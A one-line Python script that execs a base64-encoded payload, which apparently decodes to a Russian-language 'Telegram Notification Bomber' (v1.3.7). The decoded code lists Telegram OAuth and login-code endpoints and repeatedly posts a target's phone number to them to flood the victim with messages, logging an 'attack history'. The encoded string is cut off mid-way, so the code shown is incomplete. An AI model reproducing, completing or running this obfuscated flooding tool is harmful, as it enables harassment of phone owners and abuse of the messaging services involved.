import base64;exec(base64.b64decode('CmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCByZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhCgp0cnk6CiAgICBmcm9tIHB5c3R5bGUgaW1wb3J0IENvbG9yYXRlLCBDb2xvcnMsIFdyaXRlLCBDZW50ZXIKICAgIGltcG9ydCByZXF1ZXN0cwogICAgaW1wb3J0IGZha2VfdXNlcmFnZW50CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCLQntGC0YHRg9GC0YHRgtCy0YPRjtGCINC30LDQstC40YHQuNC80L7RgdGC0LghINCj0YHRgtCw0L3QvtCy0LjRgtC1INC40YU6IHBpcCBpbnN0YWxsIHB5c3R5bGUgcmVxdWVzdHMgZmFrZS11c2VyYWdlbnQiKQogICAgZXhpdCgxKQoKREVGQVVMVF9ERUxBWSA9ICgwLjcsIDEuNSkKTUFYX1JFVFJJRVMgPSAzCkNPT0xET1dOX01JTlVURVMgPSAxMApTRVNTSU9OID0gcmVxdWVzdHMuU2Vzc2lvbigpCgpBVFRBQ0tfSElTVE9SWSA9IFtdCkxBU1RfVVNBR0VfVElNRSA9IE5vbmUKClRHX0VORFBPSU5UUyA9IFsKICAgICJodHRwczovL29hdXRoLnRlbGVncmFtLm9yZy9hdXRoP2JvdF9pZD01NDQ0MzIzMjc5Jm9yaWdpbj1odHRwcyUzQSUyRiUyRmZyYWdtZW50LmNvbSZyZXF1ZXN0X2FjY2Vzcz13cml0ZSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZmcmFnbWVudC5jb20lMkYiLAogICAgImh0dHBzOi8vb2F1dGgudGVsZWdyYW0ub3JnL2F1dGgvcmVxdWVzdD9ib3RfaWQ9MTg1MjUyMzg1NiZvcmlnaW49aHR0cHMlM0ElMkYlMkZjYWJpbmV0LnByZXNzY29kZS5hcHAmZW1iZWQ9MSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZjYWJpbmV0LnByZXNzY29kZS5hcHAlMkZsb2dpbiIsCiAgICAiaHR0cHM6Ly90cmFuc2xhdGlvbnMudGVsZWdyYW0ub3JnL2F1dGgvcmVxdWVzdCIsCiAgICAiaHR0cHM6Ly9vYXV0aC50ZWxlZ3JhbS5vcmcvYXV0aD9ib3RfaWQ9MTE5OTU1ODIzNiZvcmlnaW49aHR0cHMlM0ElMkYlMkZib3QtdC5jb20mZW1iZWQ9MSZyZXF1ZXN0X2FjY2Vzcz13cml0ZSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZib3QtdC5jb20lMkZsb2dpbiIsCiAgICAiaHR0cHM6Ly9vYXV0aC50ZWxlZ3JhbS5vcmcvYXV0aC9yZXF1ZXN0P2JvdF9pZD0xMDkzMzg0MTQ2Jm9yaWdpbj1odHRwcyUzQSUyRiUyRm9mZi1ib3QucnUmZW1iZWQ9MSZyZXF1ZXN0X2FjY2Vzcz13cml0ZSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZvZmYtYm90LnJ1JTJGcmVnaXN0ZXIlMkZjb25uZWN0ZWQtYWNjb3VudHMlMkZzbW9kZGVyc190ZWxlZ3JhbSUyRiUzRnNldHVwJTNEMSIsCiAgICAiaHR0cHM6Ly9vYXV0aC50ZWxlZ3JhbS5vcmcvYXV0aC9yZXF1ZXN0P2JvdF9pZD00NjYxNDE4MjQmb3JpZ2luPWh0dHBzJTNBJTJGJTJGbWlwcGVkLmNvbSZlbWJlZD0xJnJlcXVlc3RfYWNjZXNzPXdyaXRlJnJldHVybl90bz1odHRwcyUzQSUyRiUyRm1pcHBlZC5jb20lMkZmJTJGcmVnaXN0ZXIlMkZjb25uZWN0ZWQtYWNjb3VudHMlMkZzbW9kZGVyc190ZWxlZ3JhbSUyRiUzRnNldHVwJTNEMSIsCiAgICAiaHR0cHM6Ly9vYXV0aC50ZWxlZ3JhbS5vcmcvYXV0aC9yZXF1ZXN0P2JvdF9pZD01NDYzNzI4MjQzJm9yaWdpbj1odHRwcyUzQSUyRiUyRnd3dy5zcG90LnV6JnJldHVybl90bz1odHRwcyUzQSUyRiUyRnd3dy5zcG90LnV6JTJGcnUlMkYyMDIyJTJGMDQlMkYyOSUyRnlvdG8lMkYlMjMiLAogICAgImh0dHBzOi8vb2F1dGgudGVsZWdyYW0ub3JnL2F1dGgvcmVxdWVzdD9ib3RfaWQ9MTczMzE0MzkwMSZvcmlnaW49aHR0cHMlM0ElMkYlMkZ0Yml6LnBybyZlbWJlZD0xJnJlcXVlc3RfYWNjZXNzPXdyaXRlJnJldHVybl90bz1odHRwcyUzQSUyRiUyRnRiaXoucHJvJTJGbG9naW4iLAogICAgImh0dHBzOi8vb2F1dGgudGVsZWdyYW0ub3JnL2F1dGgvcmVxdWVzdD9ib3RfaWQ9MzE5NzA5NTExJm9yaWdpbj1odHRwcyUzQSUyRiUyRnRlbGVncmFtYm90LmJpeiZlbWJlZD0xJnJldHVybl90bz1odHRwcyUzQSUyRiUyRnRlbGVncmFtYm90LmJpeiUyRiIsCiAgICAiaHR0cHM6Ly9vYXV0aC50ZWxlZ3JhbS5vcmcvYXV0aC9yZXF1ZXN0P2JvdF9pZD0xODAzNDI0MDE0Jm9yaWdpbj1odHRwcyUzQSUyRiUyRnJ1LnRlbGVncmFtLXN0b3JlLmNvbSZlbWJlZD0xJnJlcXVlc3RfYWNjZXNzPXdyaXRlJnJldHVybl90bz1odHRwcyUzQSUyRiUyRnJ1LnRlbGVncmFtLXN0b3JlLmNvbSUyRmNhdGFsb2clMkZzZWFyY2giLAogICAgImh0dHBzOi8vb2F1dGgudGVsZWdyYW0ub3JnL2F1dGgvcmVxdWVzdD9ib3RfaWQ9MjEwOTQ0NjU1Jm9yaWdpbj1odHRwcyUzQSUyRiUyRmNvbWJvdC5vcmcmZW1iZWQ9MSZyZXF1ZXN0X2FjY2Vzcz13cml0ZSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZjb21ib3Qub3JnJTJGbG9naW4iLAogICAgImh0dHBzOi8vb2F1dGgudGVsZWdyYW0ub3JnL2F1dGg/Ym90X2lkPTU0NzA0MzQzNiZvcmlnaW49aHR0cHMlM0ElMkYlMkZzdGFydHBhY2sucnUmZW1iZWQ9MSZyZXF1ZXN0X2FjY2Vzcz13cml0ZSZyZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZzdGFydHBhY2sucnUlMkZ3aWRnZXRzJTJGbG9naW4iLAogICAgImh0dHBzOi8vbXkudGVsZWdyYW0ub3JnL2F1dGgvc2VuZF9wYXNzd29yZCIsCl0KCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oImNscyIgaWYgb3MubmFtZSA9PSAibnQiIGVsc2UgImNsZWFyIikKCgpkZWYgY3JlYXRlX2dyYWRpZW50KHRleHQsIHN0YXJ0X3JnYj0oMjU1LCAxNDAsIDApLCBlbmRfcmdiPSgxNDgsIDAsIDIxMSkpOgogICAgbGluZXMsIHJlc3VsdCA9IHRleHQuc3BsaXRsaW5lcygpLCBbXQogICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgY29sb3JlZF9saW5lID0gIiIKICAgICAgICBpZiBsaW5lLnN0cmlwKCk6CiAgICAgICAgICAgIGxlbmd0aCA9IGxlbihsaW5lKQogICAgICAgICAgICBmb3IgaSwgY2hhciBpbiBlbnVtZXJhdGUobGluZSk6CiAgICAgICAgICAgICAgICByYXRpbyA9IGkgLyBtYXgoMSwgbGVuZ3RoIC0gMSkKICAgICAgICAgICAgICAgIHIgPSBpbnQoc3RhcnRfcmdiWzBdICogKDEgLSByYXRpbykgKyBlbmRfcmdiWzBdICogcmF0aW8pCiAgICAgICAgICAgICAgICBnID0gaW50KHN0YXJ0X3JnYlsxXSAqICgxIC0gcmF0aW8pICsgZW5kX3JnYlsxXSAqIHJhdGlvKQogICAgICAgICAgICAgICAgYiA9IGludChzdGFydF9yZ2JbMl0gKiAoMSAtIHJhdGlvKSArIGVuZF9yZ2JbMl0gKiByYXRpbykKICAgICAgICAgICAgICAgIGNvbG9yZWRfbGluZSArPSBmIlwwMzNbMzg7Mjt7cn07e2d9O3tifW17Y2hhcn1cMDMzWzBtIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGNvbG9yZWRfbGluZSA9IGxpbmUKICAgICAgICByZXN1bHQuYXBwZW5kKGNvbG9yZWRfbGluZSkKICAgIHJldHVybiAiXG4iLmpvaW4ocmVzdWx0KQoKCgpkZWYgY2VudGVyX3RleHQodGV4dCwgd2lkdGgpOgogICAgbGluZXMgPSB0ZXh0LnNwbGl0bGluZXMoKQogICAgY2VudGVyZWRfbGluZXMgPSBbXQogICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgdmlzaWJsZV9sZW5ndGggPSBsZW4ocmUuc3ViKHInXDAzM1xbW15tXSptJywgJycsIGxpbmUpKQogICAgICAgIHBhZGRpbmcgPSBtYXgoMCwgKHdpZHRoIC0gdmlzaWJsZV9sZW5ndGgpIC8vIDIpCiAgICAgICAgY2VudGVyZWRfbGluZXMuYXBwZW5kKCcgJyAqIHBhZGRpbmcgKyBsaW5lKQogICAgcmV0dXJuICdcbicuam9pbihjZW50ZXJlZF9saW5lcykKCgpkZWYgc2hvd19iYW5uZXIoKToKICAgIGJhbm5lcl93aWR0aCA9IDY1CiAgICBiYW5uZXIgPSBmIiIiCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAgIOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWXICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgICAgICAgICAgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICDilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ3ilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZEgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICDilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZEgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICDilojilojilojilojilojilojilZTilZ3ilojilojilZEgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWRICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgICAgICAgICAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVnSAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnSAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICAgICAg4paI4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICAgIOKVkQrilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXICAgICDilZEK4pWRICAgICDilojilojilojilojilojilZcgIOKWiOKWiOKVkSAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAg4pWRCuKVkSAgICAg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZEgICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZcgICAgIOKVkQrilZEgICAgIOKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZEgICAgIOKVkQrilZEgICAgIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAg4pWRCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICBbIFRlbGVncmFtIE5vdGlmaWNhdGlvbiBCb21iZXIgdjEuMy43IF0gICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICBbINCQ0LLRgtC+0YA6IEBGR0JydWggfCBAQnJ1aFlvdVRlZXRoIF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgIFsgRVNDIC0g0JLRi9GF0L7QtCB8IENUUkwrQyAtINCh0YLQvtC/IF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCiIiIgogICAgY2VudGVyZWRfY29udGVudCA9IGNlbnRlcl90ZXh0KGJhbm5lciwgYmFubmVyX3dpZHRoICsgMTApCiAgICByZXR1cm4gY3JlYXRlX2dyYWRpZW50KGNlbnRlcmVkX2NvbnRlbnQpCgoKZGVmIHZhbGlkYXRlX3Bob25lKHBob25lKToKICAgIGRpZ2l0c19vbmx5ID0gcmUuc3ViKHInXEQnLCAnJywgcGhvbmUpCgogICAgaWYgbGVuKGRpZ2l0c19vbmx5KSA8IDEwIG9yIGxlbihkaWdpdHNfb25seSkgPiAxMjoKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGlmIGRpZ2l0c19vbmx5LnN0YXJ0c3dpdGgoJzgnKSBhbmQgbGVuKGRpZ2l0c19vbmx5KSA9PSAxMToKICAgICAgICByZXR1cm4gJzcnICsgZGlnaXRzX29ubHlbMTpdCiAgICBlbGlmIGRpZ2l0c19vbmx5LnN0YXJ0c3dpdGgoJzcnKSBhbmQgbGVuKGRpZ2l0c19vbmx5KSA9PSAxMToKICAgICAgICByZXR1cm4gZGlnaXRzX29ubHkKICAgIGVsaWYgbGVuKGRpZ2l0c19vbmx5KSA9PSAxMDoKICAgICAgICByZXR1cm4gJzcnICsgZGlnaXRzX29ubHkKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIGRpZ2l0c19vbmx5CgoKZGVmIGNoZWNrX2Nvb2xkb3duKCk6CiAgICBnbG9iYWwgTEFTVF9VU0FHRV9USU1FCgogICAgaWYgbm90IExBU1RfVVNBR0VfVElNRToKICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIHRyeToKICAgICAgICBjdXJyZW50X3RpbWUgPSBkYXRldGltZS5ub3coKQogICAgICAgIHRpbWVfZGlmZiA9IGN1cnJlbnRfdGltZSAtIExBU1RfVVNBR0VfVElNRQoKICAgICAgICBpZiB0aW1lX2RpZmYudG90YWxfc2Vjb25kcygpIDwgQ09PTERPV05fTUlOVVRFUyAqIDYwOgogICAgICAgICAgICBtaW51dGVzX2xlZnQgPSBDT09MRE9XTl9NSU5VVEVTIC0gKHRpbWVfZGlmZi50b3RhbF9zZWNvbmRzKCkgLy8gNjApCiAgICAgICAgICAgIHJldHVybiBpbnQobWludXRlc19sZWZ0KQoKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYi0J7RiNC40LHQutCwINC/0YDQvtCy0LXRgNC60Lgg0LLRgNC10LzQtdC90Lg6IHtlfSIpCiAgICAgICAgcmV0dXJuIFRydWUKCgpkZWYgdXBkYXRlX3VzYWdlX3RpbWUoKToKICAgIGdsb2JhbCBMQVNUX1VTQUdFX1RJTUUKICAgIExBU1RfVVNBR0VfVElNRSA9IGRhdGV0aW1lLm5vdygpCgoKZGVmIHNlbmRfcmVxdWVzdCh1cmwsIHBob25lLCBwcm94eT1Ob25lKToKICAgIHRyeToKICAgICAgICB1YSA9IGZha2VfdXNlcmFnZW50LlVzZXJBZ2VudCgpLnJhbmRvbQogICAgZXhjZXB0OgogICAgICAgIHVhID0gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTMxIFNhZmFyaS81MzcuMzYiCgogICAgaGVhZGVycyA9IHsKICAgICAgICAiVXNlci1BZ2VudCI6IHVhLAogICAgICAgICJBY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgiLAogICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjUiLAogICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSwgYnIiLAogICAgICAgICJDb25uZWN0aW9uIjogImtlZXAtYWxpdmUiLAogICAgICAgICJVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzIjogIjEiLAogICAgICAgICJETlQiOiAiMSIsCiAgICB9CgogICAgIyBUT0RPOiDQtNC+0LHQsNCy0LjRgtGMINCy0YDQsNGJ0LXQvdC40LUKCiAgICBkYXRhID0geyJwaG9uZSI6IHBob25lfQoKICAgIGZvciBhdHRlbXB0IGluIHJhbmdlKE1BWF9SRVRSSUVTKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3AgPSBTRVNTSU9OLnBvc3QoCiAgICAgICAgICAgICAgICB1cmwsCiAgICAgICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgICAgICBkYXRhPWRhdGEsCiAgICAgICAgICAgICAgICB0aW1lb3V0PTUsCiAgICAgICAgICAgICAgICBwcm94aWVzPXByb3h5CiAgICAgICAgICAgICkKCiAgICAgICAgICAgIGlmIHJlc3Auc3RhdHVzX2NvZGUgPj0gNDAwOgogICAgICAgICAgICAgICAgcHJpbnQoZiJVUkwge3VybH0g0LLQtdGA0L3Rg9C7INC60L7QtCB7cmVzcC5zdGF0dXNfY29kZX0iKQoKICAgICAgICAgICAgcmV0dXJuIHJlc3Auc3RhdHVzX2NvZGUgPCA0MDAKCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuVGltZW91dDoKICAgICAgICAgICAgY29udGludWUKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmItCe0YjQuNCx0LrQsCDQv9GA0Lgg0LfQsNC/0YDQvtGB0LUge3VybH06IHtzdHIoZSl9IikKICAgICAgICAgICAgYnJlYWsKCiAgICByZXR1cm4gRmFsc2UKCgpkZWYgcnVuX2JvbWJlcihwaG9uZSk6CiAgICBjeWNsZXMgPSAwCiAgICBzdWNjZXNzX2NvdW50ID0gMAogICAgc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICBkZWxheV9taW4sIGRlbGF5X21heCA9IERFRkFVTFRfREVMQVkKICAgIG1heF9jeWNsZXMgPSAxMDAwCgogICAgcHJpbnQoZiJcblsrXSDQl9Cw0L/Rg9GB0LrQsNGOINGE0LvRg9C0INC90LAgK3twaG9uZX0iKQogICAgcHJpbnQoIlsrXSDQlNC70Y8g0L7RgdGC0LDQvdC+0LLQutC4INC90LDQttC80LjRgtC1IEN0cmwrQ1xuIikKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgY3ljbGVzIDwgbWF4X2N5Y2xlczoKICAgICAgICAgICAgZW5kcG9pbnRzID0gbGlzdChUR19FTkRQT0lOVFMpCiAgICAgICAgICAgIHJhbmRvbS5zaHVmZmxlKGVuZHBvaW50cykKCiAgICAgICAgICAgIGJhdGNoX3NpemUgPSBtaW4ocmFuZG9tLnJhbmRpbnQoMywgNSksIGxlbihlbmRwb2ludHMpKQogICAgICAgICAgICBmb3IgdXJsIGluIGVuZHBvaW50c1s6YmF0Y2hfc2l6ZV06CiAgICAgICAgICAgICAgICBpZiBzZW5kX3JlcXVlc3QodXJsLCBwaG9uZSk6CiAgICAgICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCgogICAgICAgICAgICBjeWNsZXMgKz0gMQoKICAgICAgICAgICAgaWYgY3ljbGVzICUgMyA9PSAwOgogICAgICAgICAgICAgICAgZWxhcHNlZCA9IHRpbWUudGltZSgpIC0gc3RhcnRfdGltZQogICAgICAgICAgICAgICAgcmF0ZSA9IHN1Y2Nlc3NfY291bnQgLyBlbGFwc2VkIGlmIGVsYXBzZWQgPiAwIGVsc2UgMAogICAgICAgICAgICAgICAgcHJpbnQoZiJbKl0g0J/RgNC+0LPRgNC10YHRgToge3N1Y2Nlc3NfY291bnR9INGB0L7QvtCx0YnQtdC90LjQuSDQvtGC0L/RgNCw0LLQu9C10L3QviAoe3JhdGU6LjFmfS/RgdC10LopIikKCiAgICAgICAgICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oZGVsYXlfbWluLCBkZWxheV9tYXgpKQoKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5bIV0g0J/RgNC10YDQstCw0L3QviDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQvCIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJcblshXSDQn9GA0L7QuNC30L7RiNC70LAg0L7RiNC40LHQutCwOiB7c3RyKGUpfSIpCgogICAgZWxhcHNlZCA9IHRpbWUudGltZSgpIC0gc3RhcnRfdGltZQogICAgcHJpbnQoZiJcblsrXSDQkNGC0LDQutCwINC30LDQstC10YDRiNC10L3QsDoge3N1Y2Nlc3NfY291bnR9INGB0L7QvtCx0YnQtdC90LjQuSDQt9CwIHtlbGFwc2VkOi4xZn0g0YHQtdC60YPQvdC0IikKICAgIHByaW50KGYiWytdINCh0LrQvtGA0L7RgdGC0Yw6IHtzdWNjZXNzX2NvdW50IC8gZWxhcHNlZDouMWZ9INGB0L7QvtCx0YnQtdC90LjQuSDQsiDRgdC10LrRg9C90LTRgyIpCgogICAgcmV0dXJuIHN1Y2Nlc3NfY291bnQKCgpkZWYgc2F2ZV9oaXN0b3J5KHBob25lLCBzdWNjZXNzX2NvdW50KToKICAgIGdsb2JhbCBBVFRBQ0tfSElTVE9SWQoKICAgIEFUVEFDS19ISVNUT1JZLmFwcGVuZCh7CiAgICAgICAgInBob25lIjogcGhvbmUsCiAgICAgICAgInRpbWVzdGFtcCI6IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIpLAogICAgICAgICJzdWNjZXNzX2NvdW50Ijogc3VjY2Vzc19jb3VudAogICAgfSkKCiAgICBpZiBsZW4oQVRUQUNLX0hJU1RPUlkpID4gMjA6CiAgICAgICAgQVRUQUNLX0hJU1RPUlkgPSBBVFRBQ0tfSElTVE9SWVstMjA6XQoKCmRlZiBzaG93X2hpc3RvcnkoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBwcmludChzaG93X2Jhbm5lcigpKQoKICAgIGlmIG5vdCBBVFRBQ0tfSElTVE9SWToKICAgICAgICBwcmludCgiXG5bIV0g0JjRgdGC0L7RgNC40Y8g0L/Rg9GB0YLQsCIpCiAgICAgICAgaW5wdXQoIlxu0J3QsNC20LzQuNGC0LUgRW50ZXIg0LTQu9GPINCy0L7Qt9Cy0YDQsNGC0LAg0LIg0LzQtdC90Y4uLi4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KCJcbj09PSDQmNGB0YLQvtGA0LjRjyDQsNGC0LDQuiA9PT1cbiIpCiAgICBmb3IgaSwgZW50cnkgaW4gZW51bWVyYXRlKEFUVEFDS19ISVNUT1JZLCAxKToKICAgICAgICBwaG9uZSA9IGVudHJ5LmdldCgicGhvbmUiLCAidW5rbm93biIpCiAgICAgICAgdGltZXN0YW1wID0gZW50cnkuZ2V0KCJ0aW1lc3RhbXAiLCAidW5rbm93biIpCiAgICAgICAgY291bnQgPSBlbnRyeS5nZXQoInN1Y2Nlc3NfY291bnQiLCAwKQogICAgICAgIHByaW50KGYie2l9LiAre3Bob25lfSAoe3RpbWVzdGFtcH0pIC0ge2NvdW50fSDRgdC+0L7QsdGJ0LXQvdC40LkiKQoKICAgIGlucHV0KCJcbtCd0LDQttC80LjRgtC1IEVudGVyINC00LvRjyDQstC+0LfQstGA0LDRgtCwINCyINC80LXQvdGOLi4uIikKCgpkZWYgbWFpbl9tZW51KCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgcHJpbnQoc2hvd19iYW5uZXIoKSkKCiAgICAgICAgY29vbGRvd25fc3RhdHVzID0gY2hlY2tfY29vbGRvd24oKQogICAgICAgIGlmIGNvb2xkb3duX3N0YXR1cyBpcyBub3QgVHJ1ZToKICAgICAgICAgICAgcHJpbnQoZiJcblshXSDQktCd0JjQnNCQ0J3QmNCVOiDQmtGD0LvQtNCw0YPQvSDQsNC60YLQuNCy0LXQvSEg0J7RgdGC0LDQu9C+0YHRjCDQttC00LDRgtGMOiB7Y29vbGRvd25fc3RhdHVzfSDQvNC40L3Rg9GCIikKCiAgICAgICAgcHJpbnQoIlxuPT09INCT0LvQsNCy0L3QvtC1INC80LXQvdGOID09PVxuIikKICAgICAgICBwcmludCgiMS4g0JfQsNC/0YPRgdGC0LjRgtGMINGB0L/QsNC80LXRgCIpCiAgICAgICAgcHJpbnQoIjIuINCY0YHRgtC+0YDQuNGPINCw0YLQsNC6IikKICAgICAgICBwcmludCgiMy4g0J3QsNGB0YLRgNC+0LnQutC4IikKICAgICAgICBwcmludCgiMC4g0JLRi9GF0L7QtCIpCgogICAgICAgIGNob2ljZSA9IGlucHV0KCJcbtCS0YvQsdC10YDQuNGC0LUg0L7Qv9GG0LjRjjogIikKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgaWYgY29vbGRvd25fc3RhdHVzIGlzIFRydWU6CiAgICAgICAgICAgICAgICB1cGRhdGVfdXNhZ2VfdGltZSgpCiAgICAgICAgICAgICAgICBzdGFydF9zcGFtbWVyKCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYiXG5bIV0g0J3QtdCy0L7Qt9C80L7QttC90L4g0LfQsNC/0YPRgdGC0LjRgtGMINGB0L/QsNC80LXRgC4g0J/QvtC00L7QttC00LjRgtC1INC10YnQtSB7Y29vbGRvd25fc3RhdHVzfSDQvNC40L3